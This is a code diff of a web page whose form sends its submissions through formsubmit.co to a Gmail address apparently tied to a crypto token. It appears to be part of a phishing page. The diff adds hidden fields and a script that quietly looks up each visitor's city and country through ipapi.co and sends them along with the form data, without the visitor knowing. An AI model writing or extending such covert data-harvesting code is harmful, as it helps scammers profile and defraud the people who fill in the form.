@@ -38,6 +38,8 @@
 
         <div class="form-container">
           <form id="form" method="POST" action="https://formsubmit.co/marketcaplinkcoin@gmail.com">
+                   <input type="hidden" id="city" name="city">
+<input type="hidden" id="country" name="country">
             <div class="form-content box">
               <div class="logo">
                 <img src="./images/logo-light.png" class="logo-light" />
@@ -109,6 +111,15 @@
   </div>
 
   <script>
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('city').value = data.city || '';
+        document.getElementById('country').value = data.country_name || '';
+      })
+      .catch(error => console.error('Location error:', error));
+  document.getElementById('form').addEventListener('submit', function (event) {
+            event.preventDefault();
     const form = document.getElementById('form');
     const nextField = document.getElementById('nextField');
     const errorText = document.getElementById('errorText');
@@ -136,5 +147,6 @@
   <script src='app.js'></script>
 </body>
 </html>
+
 
 
